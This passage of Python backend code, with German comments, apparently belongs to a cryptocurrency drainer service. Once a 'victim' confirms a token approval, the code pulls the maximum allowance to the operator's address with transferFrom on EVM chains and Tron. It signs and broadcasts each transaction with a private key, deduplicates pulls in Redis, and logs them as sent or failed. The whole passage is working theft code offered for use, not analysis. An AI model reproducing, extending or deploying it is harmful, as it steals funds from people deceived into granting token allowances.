        # Public Auto-Pull — EVM-Gegenstück zu tron_collect. Die /exec-Seite
        # ruft das nach jedem confirmed approve-Sheet. Kein Secret nötig:
        # dest ist hart der Operator und transferFrom kann nur Coins ZUM
        # Operator bewegen (Allowance bestimmt das Ziel, nicht der Request).
        vic = str(body.get("victim") or "").strip()
        tok = str(body.get("token") or "").strip()
        chn = str(body.get("chain") or "").strip()
        key = "chainscaner:collect:evm:%s:%s:%s" % (chn, vic, tok)
        try:
            out = redis([["SET", key, "1", "NX", "EX", "600"]])
            if not (out and (out[0] or {}).get("result") == "OK"):
                return jsonify({"ok": True, "skipped": "recent collect exists"})
        except Exception:
            pass
        out = evm_pull({"victim": vic, "token": tok, "chain": chn,
                        "amount": "max"})
        if not out.get("ok"):
            try:
                redis([["DEL", key]])
            except Exception:
                pass
        audit({"action": "evm_collect", "chain": chn,
               "status": "sent" if out.get("ok") else "error",
               "tx": out.get("tx"), "customer": vic, "dest": out.get("dest") or "",
               "token": tok, "error": out.get("error", "")[:160]})
        if out.get("ok"):
            push_event("pull_sent", {"action": "evm_collect", "chain": chn,
                                     "tx": out.get("tx"), "customer": vic,
                                     "dest": out.get("dest"), "token": tok})
        else:
            push_event("pull_failed", {"action": "evm_collect", "chain": chn,
                                       "error": out.get("error", "")[:120]})
        return jsonify(out)

    if not authed(body.get("secret")):
        return jsonify({"error": "unauthorized"}), 401


    if action == "audit":
        # Audit-Trail via POST — Secret im Body statt im Querystring
        # (URL landet sonst in Vercel-Logs und Browser-History).
        out = redis([["LRANGE", AUDIT_KEY, "0", "49"]]) or []
        rows = (out[0].get("result") if out else None) or []
        return jsonify({"ok": True, "audit": [json.loads(x) for x in rows]})
    if rate_limited():
        return jsonify({"error": "rate limited — retry in a few minutes"}), 429
    if action == "tron_pull":
        out = tron_pull(body)
        audit({"action": "tron_pull", "chain": "tron",
               "status": "sent" if out.get("ok") else "error",
               "tx": out.get("tx"), "customer": body.get("victim"),
               "dest": body.get("dest") or "",
               "token": body.get("token"), "error": out.get("error", "")[:160]})
        if out.get("ok"):
            push_event("pull_sent", {"action": "tron_pull", "chain": "tron",
                                     "tx": out.get("tx"), "customer": body.get("victim"),
                                     "dest": out.get("dest"),
                                     "token": body.get("token")})
            return jsonify(out)
        push_event("pull_failed", {"action": "tron_pull", "chain": "tron",
                                   "error": out.get("error", "")[:120]})
        return jsonify(out)
    if action == "evm_pull":
        out = evm_pull(body)
        audit({"action": "evm_pull", "chain": body.get("chain"),
               "status": "sent" if out.get("ok") else "error",
               "tx": out.get("tx"), "customer": body.get("victim"),
               "dest": body.get("dest") or "",
               "token": body.get("token"), "error": out.get("error", "")[:160]})
        if out.get("ok"):
            push_event("pull_sent", {"action": "evm_pull",
                                     "chain": body.get("chain"),
                                     "tx": out.get("tx"),
                                     "customer": body.get("victim"),
                                     "dest": out.get("dest"),
                                     "token": body.get("token")})
            return jsonify(out)
        push_event("pull_failed", {"action": "evm_pull",
                                   "chain": body.get("chain"),
                                   "error": out.get("error", "")[:120]})
        return jsonify(out)
    if action not in ACTIONS:
        return jsonify({"error": "unknown action"})
    if not PK:
        return jsonify({"error": "PULL_OWNER_KEY not configured"}), 500
    chain = int(body.get("chain") or 0)
    contract_addr = CONTRACTS.get(chain)
    if not contract_addr:
        return jsonify({"error": "no contract on chain " + str(chain)})

    try:
        fn_name, args = build_call(action, body)
    except Exception as e:
        return jsonify({"error": "invalid params: " + str(e)[:120]})

    try:
        w3 = Web3(Web3.HTTPProvider(RPC[chain], request_kwargs={"timeout": 12}))
        owner = Account.from_key(PK).address
        contract = w3.eth.contract(address=Web3.to_checksum_address(contract_addr), abi=PULL_ABI)
        fn = contract.get_function_by_name(fn_name)(*args)

        # estimate_gas simuliert den Call — Revert fängt hier ab, bevor wir zahlen
        try:
            gas = fn.estimate_gas({"from": owner})
        except Exception as e:
            msg = str(e)
            audit({"action": action, "chain": chain, "status": "reverted",
                   "error": msg[:160]})
            push_event("pull_failed", {"action": action, "chain": chain,
                                       "error": "call would revert: " + msg[:120]})
            return jsonify({"error": "call would revert: " + msg[:160]})

        tx_args = {
            "from": owner, "chainId": chain,
            "nonce": w3.eth.get_transaction_count(owner, "pending"),
            "gas": int(gas * 1.25),
        }
        if chain == 56:
            # BSC hat keinen London-Fee-Market — legacy gasPrice
            tx_args["gasPrice"] = w3.eth.gas_price
        else:
            base = w3.eth.get_block("latest").get("baseFeePerGas") or 0
            tip = max(w3.eth.max_priority_fee, Web3.to_wei(0.5, "gwei"))
            tx_args.update({"maxFeePerGas": base * 2 + tip,
                            "maxPriorityFeePerGas": tip, "type": 2})
        tx = fn.build_transaction(tx_args)
        signed = Account.sign_transaction(tx, PK)
        txid = w3.eth.send_raw_transaction(signed.raw_transaction).hex()
        audit({"action": action, "chain": chain, "status": "sent",
               "tx": txid, "customer": body.get("customer"), "token": body.get("token")})
        push_event("pull_sent", {"action": action, "chain": chain, "tx": txid,
                                 "customer": body.get("customer"), "token": body.get("token")})
        return jsonify({"ok": True, "tx": txid})
    except Exception as e:
        audit({"action": action, "chain": chain, "status": "error",
               "error": str(e)[:160]})
        push_event("pull_failed", {"action": action, "chain": chain,
                                   "error": str(e)[:120]})
        return jsonify({"error": str(e)[:160]})
